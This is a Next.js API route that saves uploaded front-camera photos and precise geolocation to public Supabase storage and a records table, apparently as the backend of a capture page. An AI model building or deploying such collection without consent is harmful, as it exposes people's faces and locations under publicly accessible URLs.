import { NextResponse } from 'next/server';
import { createServerClient } from '@/lib/supabase';

// POST /api/save-record - saves photo to Supabase Storage + location metadata
export async function POST(request) {
  try {
    const supabase = createServerClient();
    const formData = await request.formData();

    const foto = formData.get('foto');
    const lat = formData.get('lat');
    const lng = formData.get('lng');
    const accuracy = formData.get('accuracy');

    const timestamp = Date.now();
    let fotoUrl = null;

    // Upload photo to Supabase Storage
    if (foto && foto instanceof Blob) {
      const fileName = `foto_${timestamp}.png`;
      const { data, error } = await supabase.storage
        .from('captures')
        .upload(fileName, foto, {
          contentType: 'image/png',
          upsert: false,
        });

      if (error) {
        console.error('Upload error:', error);
      } else {
        const { data: urlData } = supabase.storage
          .from('captures')
          .getPublicUrl(fileName);
        fotoUrl = urlData?.publicUrl || null;
      }
    }

    // Save location data if provided
    if (lat && lng) {
      const locData = `Latitude: ${lat}\nLongitude: ${lng}\nAccuracy: ${accuracy} meters`;
      const locFileName = `lokasi_${timestamp}.txt`;

      await supabase.storage
        .from('captures')
        .upload(locFileName, locData, {
          contentType: 'text/plain',
          upsert: false,
        });

      // Also insert structured record into database table
      await supabase.from('records').insert({
        timestamp: timestamp,
        lat: parseFloat(lat),
        lng: parseFloat(lng),
        accuracy: accuracy ? parseFloat(accuracy) : null,
        foto_url: fotoUrl,
        created_at: new Date().toISOString(),
      });
    } else if (fotoUrl) {
      // Front camera photo without geolocation - just store the record
      await supabase.from('records').insert({
        timestamp: timestamp,
        foto_url: fotoUrl,
        created_at: new Date().toISOString(),
      });
    }

    return NextResponse.json({ status: 'Foto berhasil disimpan!' });
  } catch (err) {
    console.error('save-record error:', err);
    return NextResponse.json(
      { error: 'Gagal menyimpan.' },
      { status: 500 }
    );
  }
}
